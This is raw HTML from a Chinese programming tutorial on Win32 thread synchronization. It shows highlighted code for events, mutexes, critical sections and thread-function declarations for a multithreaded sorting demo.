<span class=\"crayon-e\">LPSECURITY_ATTRIBUTES </span><span class=\"crayon-v\">lpEventAttributes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 安全属性结构指针，可为NULL；</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-3\">　<span class=\"crayon-t\">BOOL</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bManualReset</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 手动清除信号标记，TRUE在WaitForSingleObject后必须手动//调用RetEvent清除信号。若为　FALSE则在WaitForSingleObject</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-4\">　<span class=\"crayon-c\">//后，系统自动清除事件信号；</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-5\">　<span class=\"crayon-t\">BOOL</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bInitialState</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 初始状态，TRUE有信号，FALSE无信号；</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-6\">　<span class=\"crayon-e\">LPCTSTR </span><span class=\"crayon-v\">lpName</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 信号量的名称，字符数不可多于MAX_PATH；</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-7\">　<span class=\"crayon-c\">//如果遇到同名的其他信号量函数就会失败，如果遇</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-8\">　<span class=\"crayon-c\">//到同类信号同名也要注意变化；</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-9\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-11\"><span class=\"crayon-e\">HANDLE </span><span class=\"crayon-e\">CreateMutex</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-12\">　<span class=\"crayon-e\">LPSECURITY_ATTRIBUTES </span><span class=\"crayon-v\">lpMutexAttributes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 安全属性结构指针，可为NULL</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-13\">　<span class=\"crayon-t\">BOOL</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bInitialOwner</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 当前建立互斥量是否占有该互斥量TRUE表示占有，</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-14\">　<span class=\"crayon-c\">//这样其他线程就不能获得此互斥量也就无法进入由</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-15\">　<span class=\"crayon-c\">//该互斥量控制的临界区。FALSE表示不占有该互斥量 </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-16\">　<span class=\"crayon-e\">LPCTSTR </span><span class=\"crayon-v\">lpName</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 信号量的名称，字符数不可多于MAX_PATH如果</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-17\">　<span class=\"crayon-c\">//遇到同名的其他信号量函数就会失败，</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-18\">　<span class=\"crayon-c\">//如果遇到同类信号同名也要注意变化；</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-19\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-20\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-21\"><span class=\"crayon-c\">//初始化临界区信号，使用前必须先初始化</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-22\"><span class=\"crayon-t\">VOID</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">InitializeCriticalSection</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-23\">　<span class=\"crayon-e\">LPCRITICAL_SECTION </span><span class=\"crayon-v\">lpCriticalSection</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 临界区变量指针</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-24\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-25\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-26\"><span class=\"crayon-c\">//阻塞函数</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-27\"><span class=\"crayon-c\">//如果等待的信号量不可用，那么线程就会挂起，直到信号可用</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-28\"><span class=\"crayon-c\">//线程才会被唤醒，该函数会自动修改信号，如Event，线程被唤醒之后</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-29\"><span class=\"crayon-c\">//Event信号会变得无信号，Mutex、Semaphore等也会变。</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-30\"><span class=\"crayon-e\">DWORD </span><span class=\"crayon-e\">WaitForSingleObject</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-31\">　<span class=\"crayon-e\">HANDLE </span><span class=\"crayon-v\">hHandle</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 等待对象的句柄</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-32\">　<span class=\"crayon-e\">DWORD </span><span class=\"crayon-v\">dwMilliseconds</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 等待毫秒数，INFINITE表示无限等待</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-33\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-34\"><span class=\"crayon-c\">//如果要等待多个信号可以使用WaitForMutipleObject函数</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-35\"><span class=\"crayon-o\">*</span><span class=\"crayon-o\">/</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b66733011320\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include \"stdafx.h\"\r\n#include \"stdlib.h\"\r\n#include \"memory.h\"\r\nHANDLE evtTerminate; //事件信号,标记是否所有子线程都执行完\r\n/*\r\n下面使用了三种控制方法，你可以注释其中两种，使用其中一种。\r\n注意修改时要连带修改临界区PrintResult里的相应控制语句\r\n*/\r\nHANDLE evtPrint; //事件信号,标记事件是否已发生\r\n//CRITICAL_SECTION csPrint; //临界区\r\n//HANDLE mtxPrint; //互斥信号,如有信号表明已经有线程进入临界区并拥有此信号\r\nstatic long ThreadCompleted = 0; \r\n/*用来标记四个子线程中已完成线程的个数,当一个子线程完成时就对ThreadCompleted进行加一操作, 要使用InterlockedIncrement(long* lpAddend)和InterlockedDecrement(long* lpAddend)进行加减操作*/</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b66733011320-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b66733011320-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b66733011320-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b66733011320-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b66733011320-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b66733011320-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b66733011320-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b66733011320-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b66733011320-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b66733011320-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b66733011320-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b66733011320-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b66733011320-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b66733011320-1\"><span class=\"crayon-p\">#include \"stdafx.h\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b66733011320-2\"><span class=\"crayon-p\">#include \"stdlib.h\"</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b66733011320-3\"><span class=\"crayon-p\">#include \"memory.h\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b66733011320-4\"><span class=\"crayon-e\">HANDLE </span><span class=\"crayon-v\">evtTerminate</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//事件信号,标记是否所有子线程都执行完</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b66733011320-5\"><span class=\"crayon-c\">/*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b66733011320-6\"><span class=\"crayon-c\">下面使用了三种控制方法，你可以注释其中两种，使用其中一种。</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b66733011320-7\"><span class=\"crayon-c\">注意修改时要连带修改临界区PrintResult里的相应控制语句</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b66733011320-8\"><span class=\"crayon-c\">*/</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b66733011320-9\"><span class=\"crayon-e\">HANDLE </span><span class=\"crayon-v\">evtPrint</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//事件信号,标记事件是否已发生</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b66733011320-10\"><span class=\"crayon-c\">//CRITICAL_SECTION csPrint; //临界区</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b66733011320-11\"><span class=\"crayon-c\">//HANDLE mtxPrint; //互斥信号,如有信号表明已经有线程进入临界区并拥有此信号</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b66733011320-12\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ThreadCompleted</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b66733011320-13\"><span class=\"crayon-c\">/*用来标记四个子线程中已完成线程的个数,当一个子线程完成时就对ThreadCompleted进行加一操作, 要使用InterlockedIncrement(long* lpAddend)和InterlockedDecrement(long* lpAddend)进行加减操作*/</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b6a902214349\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n//下面的结构是用于传送排序的数据给各个排序子线程\r\nstruct MySafeArray\r\n{\r\n　long* data;\r\n　int iLength;\r\n};</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b6a902214349-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b6a902214349-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b6a902214349-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b6a902214349-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b6a902214349-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b6a902214349-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b6a902214349-1\"><span class=\"crayon-c\">//下面的结构是用于传送排序的数据给各个排序子线程</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b6a902214349-2\"><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MySafeArray</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b6a902214349-3\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b6a902214349-4\">　<span class=\"crayon-t\">long</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b6a902214349-5\">　<span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b6a902214349-6\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b6d153635980\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n//打印每一个线程的排序结果\r\nvoid PrintResult(long* Array, int iLength, const char* HeadStr = \"sort\");</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b6d153635980-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b6d153635980-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b6d153635980-1\"><span class=\"crayon-c\">//打印每一个线程的排序结果</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b6d153635980-2\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PrintResult</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Array</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">iLength</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">HeadStr</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"sort\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b70477433924\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n//排序函数\r\nunsigned long __stdcall BubbleSort(void* theArray); //冒泡排序\r\nunsigned long __stdcall SelectSort(void* theArray); //选择排序\r\nunsigned long __stdcall HeapSort(void* theArray); //堆排序\r\nunsigned long __stdcall InsertSort(void* theArray); //插入排序</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b70477433924-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b70477433924-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b70477433924-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b70477433924-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b70477433924-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b70477433924-1\"><span class=\"crayon-c\">//排序函数</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b70477433924-2\"><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__stdcall </span><span class=\"crayon-e\">BubbleSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//冒泡排序</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b70477433924-3\"><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__stdcall </span><span class=\"crayon-e\">SelectSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//选择排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b70477433924-4\"><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__stdcall </span><span class=\"crayon-e\">HeapSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//堆排序</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b70477433924-5\"><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__stdcall </span><span class=\"crayon-e\">InsertSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">theArray</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//插入排序</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>以上四个函数的声明必须适合作为一个线程函数的必要条件才可以使用CreateThread建立一个线程。</p>\n<ol>\n<li>调用方法必须是__stdcall，即函数参数压栈顺序由右到左，而且由函数本身负责<br>\n栈的恢复, C和C++默认是__cdecl, 所以要显式声明是__stdcall</li>\n<li>返回值必须是unsigned long</li>\n<li>参数必须是一个32位值，如一个指针值或long类型</li>\n<li>如果函数是类成员函数，必须声明为static函数，在CreateThread时函数指针有特殊的写法。如下(函数是类CThreadTest的成员函数中)：<br>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b74083751827\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" 